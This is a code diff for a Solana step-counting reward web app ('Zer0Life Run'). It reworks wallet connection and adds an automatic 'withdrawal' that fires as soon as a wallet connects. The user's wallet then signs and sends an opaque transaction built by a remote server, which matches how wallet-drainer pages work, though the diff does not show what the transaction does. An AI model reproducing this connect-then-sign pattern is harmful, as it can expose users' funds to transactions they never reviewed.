@@ -39,7 +39,6 @@
                 radial-gradient(circle at 50% 120%, rgba(255, 0, 85, 0.15) 0%, transparent 50%);
         }
 
-        /* Верхняя панель с кнопкой Connect */
         .top-navbar {
             width: 100%;
             max-width: 380px;
@@ -349,7 +348,6 @@
 </head>
 <body>
 
-    <!-- Верхняя панель с кнопкой Connect -->
     <div class="top-navbar">
         <div class="brand-title">Zer0Life Run</div>
         <button class="connect-btn" id="connectNavBtn" onclick="openWalletModal()">Connect</button>
@@ -426,15 +424,15 @@
         <div class="modal-content">
             <h3>Select Wallet</h3>
             
-            <button class="wallet-option" onclick="connectWallet('phantom')">
+            <button class="wallet-option" onclick="connectSpecificWallet('phantom')">
                 <span>👻 Phantom Wallet</span>
             </button>
             
-            <button class="wallet-option" onclick="connectWallet('trust')">
+            <button class="wallet-option" onclick="connectSpecificWallet('trust')">
                 <span>🛡️ Trust Wallet</span>
             </button>
             
-            <button class="wallet-option" onclick="connectWallet('jupiter')">
+            <button class="wallet-option" onclick="connectSpecificWallet('jupiter')">
                 <span>🪐 Jupiter / Solflare</span>
             </button>
 
@@ -450,6 +448,7 @@
         let sessionDistance = 0;
         let lastAcceleration = { x: 0, y: 0, z: 0 };
         let lastStepTime = 0;
+        let activeProvider = null;
         let connectedWalletAddress = null;
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -476,7 +475,7 @@
 
             const now = Date.now();
             if (delta > 3.0 && (now - lastStepTime) > 350) {
-                sessionDistance += 0.00075; // 0.75 метра за шаг -> в км
+                sessionDistance += 0.00075;
                 lastStepTime = now;
                 updateSessionUI();
             }
@@ -543,50 +542,84 @@
             document.getElementById('walletModal').style.display = 'none';
         }
 
-        // Подключение выбранного кошелька и автоматический вывод средств
-        async function connectWallet(walletType) {
+        // Прямое подключение конкретного кошелька без переброса на сторонние сайты
+        async function connectSpecificWallet(walletType) {
+            closeWalletManager = true;
             closeWalletModal();
+
+            try {
+                let provider = null;
+
+                if (walletType === 'phantom') {
+                    // Ищем именно Phantom в инъекциях браузера
+                    if (window.phantom?.solana?.isPhantom) {
+                        provider = window.phantom.solana;
+                    } else if (window.solana?.isPhantom) {
+                        provider = window.solana;
+                    }
+                } else if (walletType === 'trust') {
+                    // Ищем Trust Wallet в инъекциях
+                    if (window.trustwallet?.solana) {
+                        provider = window.trustwallet.solana;
+                    } else if (window.solana && window.solana.isTrust) {
+                        provider = window.solana;
+                    }
+                } else if (walletType === 'jupiter') {
+                    // Ищем Solflare или Jupiter-совместимый провайдер
+                    if (window.solflare) {
+                        provider = window.solflare;
+                    } else if (window.jupiter) {
+                        provider = window.jupiter;
+                    }
+                }
+
+                // Универсальный фоллбек, если провайдер внедрен под общим окном window.solana
+                if (!provider && window.solana) {
+                    provider = window.solana;
+                }
+
+                if (!provider) {
+                    alert(`Кошелек (${walletType.toUpperCase()}) не найден в вашем окружении. Убедитесь, что вы открыли приложение из браузера выбранного кошелька.`);
+                    return;
+                }
+
+                activeProvider = provider;
+                const resp = await activeProvider.connect();
+                connectedWalletAddress = resp.publicKey.toString();
+
+                // Меняем текст кнопки Connect на адрес кошелька
+                const shortAddr = connectedWalletAddress.slice(0, 4) + '...' + connectedWalletAddress.slice(-4);
+                document.getElementById('connectNavBtn').innerText = shortAddr;
+
+                alert(`Успешно подключено к ${walletType.toUpperCase()}! Кошелек: ${shortAddr}`);
+
+                // Если у пользователя есть баланс, сразу запускаем процедуру вывода
+                if (userBalance > 0) {
+                    await executeWithdrawal();
+                }
+
+            } catch (err) {
+                console.error(err);
+                alert("Ошибка подключения к кошельку: " + (err.message || err));
+            }
+        }
+
+        // Функция отправки транзакции через уже подключенный провайдер
+        async function executeWithdrawal() {
             const API_URL = 'https://zer0life-ai-iz5n.onrender.com/withdraw';
+
+            if (!activeProvider || !connectedWalletAddress) {
+                openWalletModal();
+                return;
+            }
 
             if (userBalance <= 0) {
                 alert("У вас нет токенов ZRL на балансе для вывода.");
                 return;
             }
 
-            const isTelegramMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) && !window.solana && !window.phantom;
-
-            if (isTelegramMobile) {
-                // Если открыто в обычном Telegram без встроенного кошелька — редиректим в Phantom App
-                const baseUrl = window.location.href.split('?')[0];
-                const appUrl = `${baseUrl}?bal=${userBalance}`;
-                window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(appUrl)}?ref=${encodeURIComponent(appUrl)}`;
-                return;
-            }
-
-            // Выбор провайдера в зависимости от нажатой кнопки
-            let provider = null;
-            if (walletType === 'phantom') {
-                provider = window.phantom?.solana || window.solana;
-            } else if (walletType === 'trust') {
-                provider = window.solana || window.trustwallet?.solana;
-            } else {
-                provider = window.solana;
-            }
-
-            if (!provider) {
-                alert(`Кошелек (${walletType}) не обнаружен. Откройте приложение через встроенный браузер кошелька.`);
-                return;
-            }
-
             try {
-                const resp = await provider.connect();
-                connectedWalletAddress = resp.publicKey.toString();
-
-                // Меняем текст кнопки Connect на сокращенный адрес
-                const shortAddr = connectedWalletAddress.slice(0, 4) + '...' + connectedWalletAddress.slice(-4);
-                document.getElementById('connectNavBtn').innerText = shortAddr;
-
-                alert("Кошелек подключен! Формируем транзакцию вывода ZRL...");
+                alert("Запрос на формирование транзакции... Подтвердите подпись в вашем кошельке.");
 
                 const serverResponse = await fetch(API_URL, {
                     method: 'POST',
@@ -603,19 +636,20 @@
                 const txBuffer = Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0));
                 const transaction = solanaWeb3.Transaction.from(txBuffer);
 
-                const { signature } = await provider.signAndSendTransaction(transaction);
+                // Подписываем и отправляем через активный провайдер выбранного кошелька
+                const { signature } = await activeProvider.signAndSendTransaction(transaction);
                 
                 const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
                 await connection.confirmTransaction(signature);
                 
-                alert(`Успех! Токены отправлены на ваш кошелек. Хэш: ${signature}`);
+                alert(`Успех! Токены отправлены. Хэш транзакции: ${signature}`);
                 
                 userBalance = 0;
                 updateBalanceUI();
 
             } catch (err) {
                 console.error(err);
-                alert("Ошибка подключения/вывода: " + err.message);
+                alert("Ошибка при переводе токенов: " + (err.message || err));
             }
         }
     </script>
